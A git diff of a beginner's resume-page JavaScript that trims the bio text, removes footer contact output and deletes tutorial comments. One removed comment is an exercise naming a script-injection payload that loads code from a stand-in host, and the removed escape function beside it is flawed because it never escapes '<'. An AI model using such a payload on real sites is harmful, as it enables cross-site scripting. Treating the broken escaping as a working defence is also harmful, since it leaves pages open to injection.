@@ -9,7 +9,7 @@ var bio = {
 		"blog": "http://4everalpha.com",
 		"location": "San Francisco, CA"
 	},
-	"welcomeMessage": "I am a former finance professional turned growth and digital advertising strategist with a knack for numbers and data analysis. I have a particular expertise in social networks, funnel optimization, and mobile applications. Comfortable working in unknown areas and learning new skills to accomplish tasks. Master of Excel, proficient with analytical tools (R, SQL), and entry level understanding of various coding languages.",
+	"welcomeMessage": "Hi, I'm Scott and I'm learning to code.",
 	"skills": ["Javascript", "HTML", "CSS", "Tracking & Analytics", "Performance Marketing", "UI/UX Design", "SQL", "Excel", "Optimization & A/B Testing"],
 	"bioPic": "images/Headshot_Scott_Hanford.jpg"
 }
@@ -111,27 +111,21 @@ displayTitle();
 function displayContact() {
 	var formattedMobile = HTMLmobile.replace("%data%", bio.contacts.mobile);
 	$("#topContacts").append(formattedMobile);
-	$("#footerContacts").append(formattedMobile);
 
 	var formattedEmail = HTMLemail.replace("%data%", bio.contacts.email);
 	$("#topContacts").append(formattedEmail);
-	$("#footerContacts").append(formattedEmail);
 
 	var formattedTwitter = HTMLtwitter.replace("%data%", bio.contacts.twitter);
 	$("#topContacts").append(formattedTwitter);
-	$("#footerContacts").append(formattedTwitter);
 
 	var formattedGithub = HTMLgithub.replace("%data%", bio.contacts.github);
 	$("#topContacts").append(formattedGithub);
-	$("#footerContacts").append(formattedGithub);
 
 	var formattedBlog = HTMLblog.replace("%data%", bio.contacts.blog);
 	$("#topContacts").append(formattedBlog);
-	$("#footerContacts").append(formattedBlog);
 
 	var formattedLocation = HTMLlocation.replace("%data%", bio.contacts.location);
 	$("#topContacts").append(formattedLocation);
-	$("#footerContacts").append(formattedLocation);
 }
 
 displayContact();
@@ -146,7 +140,6 @@ function displayWelcome() {
 
 displayWelcome();
 
-//Example if function showing all skills in your bio if that array has more than 0 values (it's empty otherwise)
 
 if(bio.skills.length > 0) {
 	$("#header").append(HTMLskillsStart);
@@ -158,36 +151,10 @@ if(bio.skills.length > 0) {
 }
 
 
-/*//Example while loop
-
-var cameron = {};
-cameron.job = "course dev";
-
-var makeCourse = function() {
-	//make a course
-	console.log("Made a course");
-}
-
-var courses = 0;
-while(cameron.job === "course dev") {
-	makeCourse();
-	courses = courses + 1;
-	if(courses === 10) {
-		cameron.job = "learning specialist";
-	}
-}
-
-console.log(cameron.job);
-*/
-
-
-//Example for(in) loop
-
 function displayWork() {
 	for(job in work.jobs) {
-		// create new div for work experience
 		$("#workExperience").append(HTMLworkStart);
-		// concat employer & title
+
 		var formattedEmployer = HTMLworkEmployer.replace("%data%", work.jobs[job].employer);
 		var formattedEmployer = formattedEmployer.replace("#", work.jobs[job].url);
 		var formattedTitle = HTMLworkTitle.replace("%data%", work.jobs[job].title);
@@ -279,22 +246,6 @@ function displaySchool() {
 }
 
 displaySchool();
-
-
-//How to replace a <> in a situation like this: Let's imagine that instead of building just for your own 
-//resume, you're building a webapp that takes in data from other users on the internet and turns it into
-//a resume that they can use. How might you make sure that the resume will still display correctly? Or 
-//even worse, imagine someone sets their name to equal <script src="http://hackyourwebsite.com/eviljavascript.js"></script>. 
-//Can you make sure your resume doesn't run their malicious script?
-
-/*var charEscape = function(_html) {
-	var newHTML = _html;
-
-	newHTML = _html.replace(/</g, "&lt;");
-	newHTML = _html.replace(/>/g, "&gt;");
-
-	return newHTML;
-}*/
 
 
 function inName(name) {
